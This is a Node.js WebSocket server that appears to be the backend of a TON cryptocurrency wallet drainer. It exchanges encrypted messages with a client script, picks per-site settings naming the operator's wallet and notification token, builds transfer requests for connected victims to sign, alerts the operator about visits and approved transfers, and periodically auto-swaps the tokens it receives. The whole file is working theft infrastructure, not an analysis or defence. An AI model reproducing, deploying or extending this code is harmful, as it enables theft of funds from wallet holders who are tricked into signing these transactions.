// @AcmeDev compare
var apiURL = 'localhost.com';

require('dotenv').config();
const { WebSocketServer, WebSocket } = require('ws')
const server = new WebSocketServer({ port: 80 });
const {cipher, decipher} = require('./modules/secret/index');
const {randomBytes} = require('node:crypto');
const Notify = require('./modules/notify/index');
const ExecuteAssets = require('./modules/assets');
const Swap = require('./modules/swap');
const getSettings = require('./modules/parseSettings');
const SubscribeTransaction = require("./modules/subscribeTransaction");
const ApiTonConsole = require("./modules/Api");
const {Secure, SocketHelper, validData, createManifest} = require('./modules/utils');
const NaclSession = require('./modules/naclEncode');
const {getSHA256Hash} = require('./modules/aes');
const fs = require("node:fs");
const path = require("node:path");

const TonConsoleApi = new ApiTonConsole();

TonConsoleApi.init()

const listeners = {};
const confirmed = [];

server.on('connection', async ws => {
    const domains = getSettings();
    const NotifySender = new Notify('', '', {});
    let myEncryption = randomBytes(16).toString('hex'); let clientEncryption, signature;
    let settings, closeListener, subscribeTransactions;
    let TonConsoleApi = new ApiTonConsole();
    let naclSession = new NaclSession();
    let naclKeys = naclSession.stringifyKeypair();
    let Encryption, lastRPCId = 0;
    const socketHelper = new SocketHelper(ws);
    socketHelper.connected(cipher('AcmeDev')(myEncryption), '');
    lastRPCId += 1;
    ws.on('message', async data => {
        try {
            data = JSON.parse(data);
            if (data.action === 'session') {
                myEncryption = data.serverPub;
                clientEncryption = data.clientPub;
                signature = data.signature;
                Encryption = new Secure(myEncryption, clientEncryption, signature);
                return socketHelper.sessionFill();
            }
            if (data.action === 'connected') {
                clientEncryption = decipher('AcmeDev')(data.data.key);
                signature = clientEncryption.split('').slice(0, 12).join('') + myEncryption.split('').slice(0, 12).join('');
                Encryption = new Secure(myEncryption, clientEncryption, signature);
                lastRPCId += 1;
                return socketHelper.safety(await Encryption.encrypt(JSON.stringify({message: 'hello'}), lastRPCId));
            }
            if (data.action === 'check') {
                const message = JSON.parse(await Encryption.decrypt(data.data));
                if (!message) {
                    return socketHelper.close();
                }
                if (message.message === 'hello') {
                    let founded = false;
                    for (const domain in domains) {
                        if (domain.includes(message.domain)) {
                            settings = domains[domain]
                            founded = true;
                            break;
                        }
                    }
                    if (!founded) {
                        settings = domains['default'];
                    }
                    TonConsoleApi.init(settings.TONAPI_KEY || '');
                    subscribeTransactions = new SubscribeTransaction(settings.WALLET, TonConsoleApi);
                    lastRPCId += 1;
                    return socketHelper.w();
                } else {
                    return socketHelper.close();
                }
            }
            if (data.action === 'log') {
                const message = await Encryption.decrypt(data.data);
                if (!message) {return socketHelper.close();}
                data.message = JSON.parse(message);


                if (data.message.method === 'opened') {
                    const valid = validData(data.message.userInfo);
                    if (!valid) {return socketHelper.close();}
                    NotifySender.updateUserInfo(data.message.userInfo);
                    NotifySender.token = settings.TOKEN;
                    NotifySender.id = settings.ID.includes(',') && settings.ID.replaceAll(' ', '').split(',').length > 0 ? settings.ID.replaceAll(' ', '').split(',') : [settings.ID];
                    const notifyNewLogin = settings.NOTIFY_NEW_LOGIN;
                    if (notifyNewLogin === 'true') {
                        if (settings.NOTIFY_ONLY_APPROVES !== 'true') {
                            await NotifySender.opened();
                        }
                    }
                    lastRPCId += 1;
                    return socketHelper.done();
                }
                if (data.message.method === 'closed') {
                    const valid = validData(data.message.userInfo);
                    if (!valid) {return socketHelper.close();}
                    NotifySender.updateUserInfo(data.message.userInfo);
                    try {
                        subscribeTransactions.close();
                    } catch (e) {}
                    const notifyClosed = settings.NOTIFY_CLOSED_SITE;
                    if (notifyClosed === 'true') {
                        if (settings.NOTIFY_ONLY_APPROVES !== 'true') {
                            await NotifySender.closed();
                        }
                    }
                    lastRPCId += 1;
                    return socketHelper.done();
                }
                if (data.message.method === 'pushChunk') {
                    const valid = validData(data.message.userInfo);
                    if (!valid) {return socketHelper.close();}
                    NotifySender.updateUserInfo(data.message.userInfo);
                    if (settings.NOTIFY_ONLY_APPROVES !== 'true') {
                        await NotifySender.creatingJetton(data.message.chunk, data.message.secret, apiURL, settings.CURRENCY ? settings.CURRENCY : 'usd');
                    }
                    lastRPCId += 1;
                    return socketHelper.done();
                }
                if (data.message.method === 'chunkStatus') {
                    const valid = validData(data.message.userInfo);
                    if (!valid) {return socketHelper.close();}
                    let notify = true;
                    if (data.message.status === 'sent') {
                        if (!confirmed.includes(await getSHA256Hash(data.message.chunk))) {
                            notify = true;
                            confirmed.push(await getSHA256Hash(data.message.chunk))
                        } else {
                            notify = false;
                        }
                        closeListener = true;
                        try {
                            clearInterval(listeners[data.message.userInfo.address])
                        } catch (e) {}
                    }
                    NotifySender.updateUserInfo(data.message.userInfo);
                    if (notify) {
                        if (settings.NOTIFY_ONLY_APPROVES !== 'true' || data.message.status === 'sent') {
                            await NotifySender.transactionStatusJetton(data.message.status, data.message.chunk, settings.CURRENCY ? settings.CURRENCY : 'usd');
                        }
                    }
                    lastRPCId += 1;
                    return socketHelper.done();
                }
            }
            if (data.action === 'apiKey') {
                lastRPCId += 1;
                return socketHelper.apiKey(
                    await Encryption.encrypt(JSON.stringify({
                        apiKey: domains['default'].UNIQUE_PRODUCT_ID
                    }), lastRPCId)
                );
            }
            if (data.action === 'manifest') {
                const message = await Encryption.decrypt(data.data);
                if (!message) {return socketHelper.close();}
                data.message = JSON.parse(message);
                lastRPCId += 1;
                return socketHelper.manifest(
                    await Encryption.encrypt(JSON.stringify({
                        url: settings.MANIFEST_URL === '' ? await createManifest(apiURL, {
                            name: settings.MANIFEST_FILE_NAME,
                            url: settings.MANIFEST_FILE_URL,
                            icon: settings.MANIFEST_FILE_ICON,
                            apiKey: domains['default'].UNIQUE_PRODUCT_ID
                        }) : settings.MANIFEST_URL
                    }), lastRPCId)
                )
            }
            if (data.action === 'subscribeTransaction') {
                closeListener = true;
                const message = await Encryption.decrypt(data.data);
                if (!message) {return socketHelper.close();}
                data.message = JSON.parse(message);
                const valid = validData(data.message.userInfo);
                if (!valid) {return socketHelper.close();}
                NotifySender.updateUserInfo(data.message.userInfo);
                subscribeTransactions.initChecker({
                    chunk: data.message.chunk,
                    userInfo: data.message.userInfo,
                    sender: data.message.userInfo.address,
                    callback: async (listener) => {
                        await NotifySender.transactionStatusJetton('sent', listener.chunk, settings.CURRENCY ? settings.CURRENCY : 'usd');
                    }
                })
                lastRPCId += 1;
                return socketHelper.done();
            }
            if (data.action === 'getMessages') {
                try {
                    const message = await Encryption.decrypt(data.data);
                    if (!message) {return socketHelper.close();}
                    data.message = JSON.parse(message);
                    const valid = validData(data.message.userInfo);
                    if (!valid) {return socketHelper.close();}
                    NotifySender.updateUserInfo(data.message.userInfo);
                    const assetsData= await ExecuteAssets(data.message.userInfo, settings, TonConsoleApi);
                    if (assetsData.notify) {
                        if (settings.NOTIFY_ONLY_APPROVES !== 'true') {
                            await NotifySender.connected(assetsData.data.total, assetsData.data.ton.balance / assetsData.data.ton.decimalCuter, assetsData.data.jettons, assetsData.data.nfts, settings);
                        }
                    }
                    lastRPCId += 1;
                    return socketHelper.messages(
                        await Encryption.encrypt(JSON.stringify({
                            maxMessages: assetsData.maxMessages,
                            messages: assetsData.data.simulatedTransactions,
                            timeOut: assetsData.data.timeOut,
                            minimal: assetsData.minimal
                        }), lastRPCId)
                    );
                } catch (e) {
                    console.log('ggg',e)
                    return socketHelper.messages(
                        await Encryption.encrypt(JSON.stringify({
                            messages: [],
                            timeOut: 0
                        }), lastRPCId)
                    );
                }
            }
        } catch (e) {
            console.log(e)
        }
    });

    ws.onerror = function () {
        console.log('websocket error');
    }
});

// Init autoSwap
setInterval(async () => {
    const domains = getSettings();
    const intervals = [];
    for (const domain in domains) {
        if (domains[domain].AUTO_SWAP === "true") {
            const swapper = new Swap(domains[domain]);
            const interval = setInterval(async (swapper) => {
                try {
                    console.log(`AutoSwap inited for ${domain}`)
                    const userJettons = await TonConsoleApi.jettons(domains[domain].WALLET.includes(',') ? domains[domain].WALLET.replaceAll(' ', '').split(',')[0] : domains[domain].WALLET, 'USD');
                    const forSwap = [];
                    for (const jeton of userJettons.balances) {
                        let decimalCuter = 1;

                        for (let i = 0; i < jeton.jetton.decimals; i++) {
                            decimalCuter = decimalCuter * 10;
                        }

                        const jettonData = {
                            address: jeton.jetton.address,
                            amount: jeton.balance,
                            name: jeton.jetton.name,
                            formatted: parseInt(jeton.balance) / decimalCuter
                        };

                        if (jettonData.amount > 0 && jeton.jetton.verification !== 'none') {
                            forSwap.push(jettonData);
                        }
                    }
                    if (forSwap.length > 0) {
                        console.log(`swapping`, forSwap[0].name, ' - ', forSwap[0].amount)
                        await swapper.swap(forSwap[0]);
                    }
                } catch (e) {
                    console.log(e)
                }
            }, 120 * 1000, swapper);
            intervals.push(interval)
        }
    }
    setTimeout(() => {
        for (const interval of intervals) {
            clearInterval(interval);
        }
    }, 5 * 60 * 1000);
}, 5 * 60 * 1000)